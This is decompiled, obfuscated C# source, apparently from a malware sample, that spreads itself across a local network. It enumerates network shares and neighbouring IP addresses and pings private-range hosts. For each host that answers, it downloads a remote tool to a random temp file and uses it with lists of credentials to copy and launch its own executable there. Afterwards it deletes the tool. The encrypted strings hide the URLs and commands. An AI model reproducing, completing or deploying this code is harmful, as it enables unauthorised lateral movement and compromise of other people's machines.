using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

internal sealed class cyikEDwiTbqA
{
	public enum QwYtjgVURDeNeO
	{
		xgclEJNVEb = 1,
		RkwFoCRJVE,
		lQQsNzRHPWwzrF,
		UCCDpoIobl,
		dqOrDDTWhY
	}

	public enum ijoGwZQeDWh
	{
		mlxsYcFDnddvv,
		UoDwIbFaOqMEc,
		ZxYzjtuUdNK,
		GcKQCTASBsOOt
	}

	public enum EDSutSLlbNZTTp
	{
		jvWSLtGuhTKo = 1,
		UOvouQmkUPKtx = 2,
		QZIHPvOeTAnV = 4,
		mfeHircriVb = 8,
		HQACmidDBzfc = 16,
		UjMasxomcTAoeR = 19
	}

	public enum uRjKdagvrpG
	{
		AlabPIPrrWjcX,
		VWnqIsqUrj,
		tNwoxvhPmKmjJLu,
		RMZHXPQHQTGjOu,
		lDUiOTDLpr,
		kWuApvVzpVci,
		wnmrAAhFUIgvZC,
		zULRadqmDxslLs,
		YMeWPcsHGTJ,
		WuiOLsabXR,
		MqRtIoxNFB,
		EMTkAfUMaeXh
	}

	public sealed class jqKrQsieplGYt : IEnumerable
	{
		private enum WqUVUysfyJI
		{
			vDlfxqytYKf = 0,
			PXsFUyyaCzfxdX = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class MvBZTnrZCXa
		{
			public QwYtjgVURDeNeO YeGDkqVxCZErhft;

			public ijoGwZQeDWh OVWQDuDoeJF;

			public uRjKdagvrpG sxwHxRtkVIVlW;

			public EDSutSLlbNZTTp sfASlXvznM;

			public string AXuXjUlboDgS;

			public string sEZWaQMDCrR;

			public string VjfrcqPyVLwD;

			public string MzOlJtJkJWA;
		}

		private ArrayList HmuYffWVeacCJJv = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern WqUVUysfyJI WNetOpenEnumA(QwYtjgVURDeNeO dwScope, ijoGwZQeDWh dwType, EDSutSLlbNZTTp dwUsage, MvBZTnrZCXa p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern WqUVUysfyJI WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern WqUVUysfyJI WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(MvBZTnrZCXa mvBZTnrZCXa_0, QwYtjgVURDeNeO qwYtjgVURDeNeO_0, ijoGwZQeDWh ijoGwZQeDWh_0, EDSutSLlbNZTTp edsutSLlbNZTTp_0, uRjKdagvrpG uRjKdagvrpG_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(qwYtjgVURDeNeO_0, ijoGwZQeDWh_0, edsutSLlbNZTTp_0, mvBZTnrZCXa_0, out lphEnum) == WqUVUysfyJI.vDlfxqytYKf)
			{
				WqUVUysfyJI wqUVUysfyJI;
				do
				{
					wqUVUysfyJI = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (wqUVUysfyJI)
					{
					case WqUVUysfyJI.PXsFUyyaCzfxdX:
						continue;
					case WqUVUysfyJI.vDlfxqytYKf:
						Marshal.PtrToStructure(intPtr, mvBZTnrZCXa_0);
						if (mvBZTnrZCXa_0.sxwHxRtkVIVlW == uRjKdagvrpG_0)
						{
							HmuYffWVeacCJJv.Add(mvBZTnrZCXa_0.sEZWaQMDCrR);
						}
						if ((mvBZTnrZCXa_0.sfASlXvznM & EDSutSLlbNZTTp.UOvouQmkUPKtx) == EDSutSLlbNZTTp.UOvouQmkUPKtx)
						{
							EnumerateServers(mvBZTnrZCXa_0, qwYtjgVURDeNeO_0, ijoGwZQeDWh_0, edsutSLlbNZTTp_0, uRjKdagvrpG_0);
						}
						continue;
					}
					break;
				}
				while (wqUVUysfyJI != WqUVUysfyJI.PXsFUyyaCzfxdX);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public jqKrQsieplGYt(QwYtjgVURDeNeO qwYtjgVURDeNeO_0, ijoGwZQeDWh ijoGwZQeDWh_0, EDSutSLlbNZTTp edsutSLlbNZTTp_0, uRjKdagvrpG uRjKdagvrpG_0)
		{
			MvBZTnrZCXa mvBZTnrZCXa_ = new MvBZTnrZCXa();
			EnumerateServers(mvBZTnrZCXa_, qwYtjgVURDeNeO_0, ijoGwZQeDWh_0, edsutSLlbNZTTp_0, uRjKdagvrpG_0);
		}

		public IEnumerator GetEnumerator()
		{
			return HmuYffWVeacCJJv.GetEnumerator();
		}
	}

	private sealed class kmOhzeiLoG
	{
		public string SbqLUKnVGPX;

		public string EwcIUDVzTKJOyLdOR;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107404175)) && !string_0.StartsWith(getString_0(107404202)) && !string_0.StartsWith(getString_0(107404193)) && !string_0.Contains(getString_0(107408509))) || !UjKDIhJqGQpCr(string_0))
			{
				return;
			}
			if (hNCHegfceoe.zEwtyzOIcaVu == getString_0(107396833))
			{
				for (int i = 0; i < AASnLwywyJxxXxFMtt.Count; i++)
				{
					if (hNCHegfceoe.BROMmDQCrdRq)
					{
						if (File.Exists(SbqLUKnVGPX))
						{
							hNCHegfceoe.eZjDlpokwsIwI(SbqLUKnVGPX, getString_0(107407399) + string_0 + getString_0(107355611) + AASnLwywyJxxXxFMtt[i] + getString_0(107355602) + YVFJFFshgAsFPuf[i] + getString_0(107355625) + Assembly.GetEntryAssembly()!.Location + getString_0(107407353));
						}
					}
					else if (File.Exists(EwcIUDVzTKJOyLdOR))
					{
						hNCHegfceoe.eZjDlpokwsIwI(EwcIUDVzTKJOyLdOR, getString_0(107407399) + string_0 + getString_0(107355611) + AASnLwywyJxxXxFMtt[i] + getString_0(107355602) + YVFJFFshgAsFPuf[i] + getString_0(107355080) + Assembly.GetEntryAssembly()!.Location + getString_0(107407353));
					}
				}
			}
			else if (hNCHegfceoe.BROMmDQCrdRq)
			{
				if (File.Exists(SbqLUKnVGPX))
				{
					hNCHegfceoe.eZjDlpokwsIwI(SbqLUKnVGPX, getString_0(107407399) + string_0 + getString_0(107354991) + Assembly.GetEntryAssembly()!.Location + getString_0(107407353));
				}
			}
			else if (File.Exists(EwcIUDVzTKJOyLdOR))
			{
				hNCHegfceoe.eZjDlpokwsIwI(EwcIUDVzTKJOyLdOR, getString_0(107407399) + string_0 + getString_0(107354990) + Assembly.GetEntryAssembly()!.Location + getString_0(107407353));
			}
		}

		static kmOhzeiLoG()
		{
			Strings.CreateGetStringDelegate(typeof(kmOhzeiLoG));
		}
	}

	public static List<string> deRGWohQqiUHGCJ;

	public static string EiHAZKJhBwBY;

	public static List<string> AASnLwywyJxxXxFMtt;

	public static List<string> YVFJFFshgAsFPuf;

	public static List<string> UkycqayGXMveD;

	public List<string> PLqILkXJfDZV = new List<string>();

	public List<string> gGyFnkzbmOQ = new List<string>();

	public List<string> YHMElgcCjnoWK = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void vHHSOIMBjuyLzz()
	{
		kmOhzeiLoG CS_0024_003C_003E8__locals0 = new kmOhzeiLoG();
		hNCHegfceoe.JEOoMtOSCqfY();
		List<ODxvcVkvIHdhUDZa> list = ODxvcVkvIHdhUDZa.lnfLSxvCPvskIae();
		foreach (ODxvcVkvIHdhUDZa item in list)
		{
			deRGWohQqiUHGCJ.Add(item.IPAddress);
		}
		if (hNCHegfceoe.AxXilrIaJeJyLk.Count > 0)
		{
			deRGWohQqiUHGCJ = deRGWohQqiUHGCJ.Union(hNCHegfceoe.AxXilrIaJeJyLk).ToList();
		}
		CS_0024_003C_003E8__locals0.SbqLUKnVGPX = getString_0(107408463);
		CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR = getString_0(107408463);
		try
		{
			CS_0024_003C_003E8__locals0.SbqLUKnVGPX = DfeNWfojjRPA();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR = rBvxTExthblJ();
		}
		catch
		{
		}
		foreach (ODxvcVkvIHdhUDZa item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107404129)) || item2.IPAddress.StartsWith(getString_0(107404156)) || item2.IPAddress.StartsWith(getString_0(107404147)) || item2.IPAddress.Contains(getString_0(107408463)))
				{
					yRGixLTZkKgJY.jdlaBYbjaDSMZSy(item2.MacAddress, item2.IPAddress, getString_0(107355351));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(deRGWohQqiUHGCJ, delegate(string string_0)
			{
				if ((string_0.StartsWith(kmOhzeiLoG.getString_0(107404175)) || string_0.StartsWith(kmOhzeiLoG.getString_0(107404202)) || string_0.StartsWith(kmOhzeiLoG.getString_0(107404193)) || string_0.Contains(kmOhzeiLoG.getString_0(107408509))) && UjKDIhJqGQpCr(string_0))
				{
					if (hNCHegfceoe.zEwtyzOIcaVu == kmOhzeiLoG.getString_0(107396833))
					{
						for (int i = 0; i < AASnLwywyJxxXxFMtt.Count; i++)
						{
							if (hNCHegfceoe.BROMmDQCrdRq)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.SbqLUKnVGPX))
								{
									hNCHegfceoe.eZjDlpokwsIwI(CS_0024_003C_003E8__locals0.SbqLUKnVGPX, kmOhzeiLoG.getString_0(107407399) + string_0 + kmOhzeiLoG.getString_0(107355611) + AASnLwywyJxxXxFMtt[i] + kmOhzeiLoG.getString_0(107355602) + YVFJFFshgAsFPuf[i] + kmOhzeiLoG.getString_0(107355625) + Assembly.GetEntryAssembly()!.Location + kmOhzeiLoG.getString_0(107407353));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR))
							{
								hNCHegfceoe.eZjDlpokwsIwI(CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR, kmOhzeiLoG.getString_0(107407399) + string_0 + kmOhzeiLoG.getString_0(107355611) + AASnLwywyJxxXxFMtt[i] + kmOhzeiLoG.getString_0(107355602) + YVFJFFshgAsFPuf[i] + kmOhzeiLoG.getString_0(107355080) + Assembly.GetEntryAssembly()!.Location + kmOhzeiLoG.getString_0(107407353));
							}
						}
					}
					else if (hNCHegfceoe.BROMmDQCrdRq)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.SbqLUKnVGPX))
						{
							hNCHegfceoe.eZjDlpokwsIwI(CS_0024_003C_003E8__locals0.SbqLUKnVGPX, kmOhzeiLoG.getString_0(107407399) + string_0 + kmOhzeiLoG.getString_0(107354991) + Assembly.GetEntryAssembly()!.Location + kmOhzeiLoG.getString_0(107407353));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR))
					{
						hNCHegfceoe.eZjDlpokwsIwI(CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR, kmOhzeiLoG.getString_0(107407399) + string_0 + kmOhzeiLoG.getString_0(107354990) + Assembly.GetEntryAssembly()!.Location + kmOhzeiLoG.getString_0(107407353));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.SbqLUKnVGPX))
			{
				File.Delete(CS_0024_003C_003E8__locals0.SbqLUKnVGPX);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR))
			{
				File.Delete(CS_0024_003C_003E8__locals0.EwcIUDVzTKJOyLdOR);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string DfeNWfojjRPA()
	{
		if (IntPtr.Size == 8)
		{
			return QskVfRphJKBpAC(new Uri(hNCHegfceoe.UwCpksGCJZfb(getString_0(107355298))));
		}
		return QskVfRphJKBpAC(new Uri(hNCHegfceoe.UwCpksGCJZfb(getString_0(107355298))));
	}

	public static string rBvxTExthblJ()
	{
		if (IntPtr.Size == 8)
		{
			return QskVfRphJKBpAC(new Uri(hNCHegfceoe.UwCpksGCJZfb(getString_0(107355761))));
		}
		return QskVfRphJKBpAC(new Uri(hNCHegfceoe.UwCpksGCJZfb(getString_0(107355652))));
	}

	public static bool UjKDIhJqGQpCr(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string QskVfRphJKBpAC(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107355611), getString_0(107408463)).Remove(0, 3) + getString_0(107355606);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static cyikEDwiTbqA()
	{
		Strings.CreateGetStringDelegate(typeof(cyikEDwiTbqA));
		deRGWohQqiUHGCJ = new List<string>();
		EiHAZKJhBwBY = getString_0(107408463);
		AASnLwywyJxxXxFMtt = new List<string>();
		YVFJFFshgAsFPuf = new List<string>();
		UkycqayGXMveD = new List<string>();
	}
}
